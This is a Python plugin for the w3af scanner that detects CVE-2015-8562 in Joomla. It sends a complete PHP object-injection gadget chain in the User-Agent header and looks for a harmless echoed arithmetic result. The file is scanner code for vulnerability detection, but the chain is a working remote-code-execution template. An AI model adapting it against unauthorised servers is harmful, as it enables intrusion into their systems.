from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest
from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter
from w3af.core.data.dc.headers import Headers
import w3af.core.controllers.output_manager as om

import re, random, string


class cve_2015_8562(InfrastructurePlugin):
    """
    Detect CVE 2015-8562 (Joomla < 3.4.5 - Remote Command Execution)
    """
    NAME = "CVE 2015-8562"

    @classmethod
    def php_str_noquotes(cls, data):
        "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += 'chr(%s).'%(ord(char))
        return encoded[:-1]
    
    @classmethod
    def generate_payload(cls):
        n1 = random.randint(10**3, 10**4)
        n2 = random.randint(10**3, 10**4)
        payload_str = "echo(%d*%d)"%(n1, n2)
        verify_pattern = str(n1*n2)
        php_payload = "eval({})".format(cls.php_str_noquotes(payload_str))
        terminate = '\xf0\xfd\xfd\xfd'
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{php_payload};JFactory::getConfig();exit".format(php_payload=php_payload)
        # exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += '''s:{}:"{}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
        return exploit_template, verify_pattern

    def __init__(self):
        InfrastructurePlugin.__init__(self)
        self._already_tested_dirs = ScalableBloomFilter()
        self._joomla_dirs = set()

    def discover(self, fuzzable_http_request):
        for u in fuzzable_http_request.get_url().get_directories():
            if u.url_string not in self._already_tested_dirs:
                for d in self._joomla_dirs:
                    if d in u:
                        break
                else:
                    self._already_tested_dirs.add(u.url_string)
                    self.exploit(u)

    def exploit(self, url):
        payload, verify_pattern = self.generate_payload()
        headers = Headers()
        headers["User-agent"] = payload
        response = self.requestor.http.GET(url, headers=headers)
        match = re.search(verify_pattern, response.get_body())
        if match:
            vuln_data = {
                "payload": payload,
                "verify_pattern": verify_pattern,
            }
            fr = FuzzableHTTPRequest.from_http_response(response)
            vuln = self.create_vuln("CVE 2015-8562 (Joomla < 3.4.5 - Remote Command Execution)", traffic_ids=response.id, mutant=fr, data=vuln_data)
            self.save_vuln(vuln, vuln_type="joomla")
            return True
        return False
